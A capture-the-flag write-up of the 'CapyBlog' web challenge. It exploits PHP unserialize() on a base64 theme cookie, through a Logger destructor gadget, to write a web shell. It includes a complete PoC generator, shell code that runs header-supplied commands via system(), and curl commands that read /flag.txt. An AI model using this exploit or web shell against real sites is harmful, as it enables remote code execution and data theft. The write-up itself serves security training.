# [web] CapyBlog

> **Category:** `web`  
> **CTF:** KubSTU CTF 2026 Spring

### Description:

*The theme switcher has been glitching lately. Could it be bugs? Did the site always work like this?*

### Solution:

**Finding the backup**


 ![img_1.png](./images/img_1.png)

We discover a web application backup at the path `[/backup/www.zip](http://172.20.0.2/backup/www.zip)`


#### **Discovering the Attack Vector**

It all starts with searching for functions that accept user input. In PHP, the main "red flag" is `unserialize()`, if it receives something from `$_GET`, `$_POST`, or `$_COOKIE`.

**Vulnerable section (**`utils.php`):


 ![img_2.png](./images/img_2.png)

- The application trusts the contents of the `theme` cookie. It expects an object or array with theme settings there.
- **Problem:** `unserialize()` doesn't just restore data — it creates instances of classes that are declared in the system. If we pass a string describing a `Logger` class object, PHP will create it.

When PHP restores an object from a string, it automatically calls special "magic methods". This is our lever.

**Magic methods in** `classes.php`:

1. `__wakeup()` - called IMMEDIATELY upon deserialization.
2. `__destruct()` - called when the object is removed from memory (end of script execution).
3. `__toString()` - called when the object is used as a string.

> In our case, `__wakeup` in the `FileHandler` class just opens and closes a file — boring. But `Logger` has functionality that's interesting for us.


#### **Finding a Useful "Gadget" (POP Chain)**

We're looking for a method that does something dangerous with data we can control.

**Analyzing the** `Logger` **class** (`classes.php`):


 ![img_3.png](./images/img_3.png)

- We fully control the `$logFile` and `$message` properties through the serialized string.
- We can force PHP to write **any string** to **any file** that the web server has write access to.

  #### **Writing a Shell**

Now we connect everything together. We need to:

1. Choose a filename (e.g., in the web application root `/var/www/html/`)
2. Create PHP code (shell).
3. Pack it into a format understood by `unserialize()`.

**Exploit logic:**

- Create a `Logger` object.
- Set `$logFile = "/var/www/html/css_optimizer.php"`.
- Set `$message = "<?php system(\$_GET['cmd']); ?>"`.
- Serialize (`O:6:"Logger":2:{s:7:"logFile";s:31:"..."; ...}`).
- Encode in Base64 and substitute into the cookie.

> When the script `index.php` (or any other that includes `utils.php`) finishes, the destructor of our "fake" logger will fire and create the shell file.

---

Official exploit (you can also use [online PHP compilers]() to generate the payload)

```php
<?php

/**
 * PoC Exploit for CapyBlog Deserialization
 * Generates a Base64 cookie payload for RCE
 */

class Logger
{
    public $logFile;
    public $message;

    public function __construct($file, $msg)
    {
        $this->logFile = $file;
        $this->message = $msg;
    }
}

// 1. Parameter setup
// The file will be created in the web application's root directory
$shell_filename = "general_shell.php";
$shell_path = "./" . $shell_filename;

// Shell: uses the 'X-Capy-Command' header for code execution
$shell_content = '<?php if($c=$_SERVER["HTTP_X_CAPY_COMMAND"]){echo "---OUT---\n";system($c);echo "---END---\n";} ?>';

// 2. Creating the object and generating the cookie
$exploit_obj = new Logger($shell_path, $shell_content);
$serialized_payload = serialize($exploit_obj);
$cookie_payload = base64_encode($serialized_payload);

// 3. Output commands for the attacker
echo "--- CAPYBLOG RCE EXPLOIT GENERATOR ---\n\n";

echo "[STEP 1] Send payload to create the shell:\n";
echo "curl -v -b \"theme={$cookie_payload}\" http://TARGET/index.php\n\n";

echo "[STEP 2] Verify RCE (execute 'id'):\n";
echo "curl -H \"X-Capy-Command: id\" http://TARGET/{$shell_filename}\n";



echo "[STEP 2] Verify RCE (execute 'id'):\n";
echo "curl -H \"X-Capy-Command: cat \/flag.txt\" http://TARGET/{$shell_filename}\n";


?>
```

Read the /flag file

## Flag 

```graphql
KubSTU(capybl0g_php_d3s3r1al1zat10n)
```


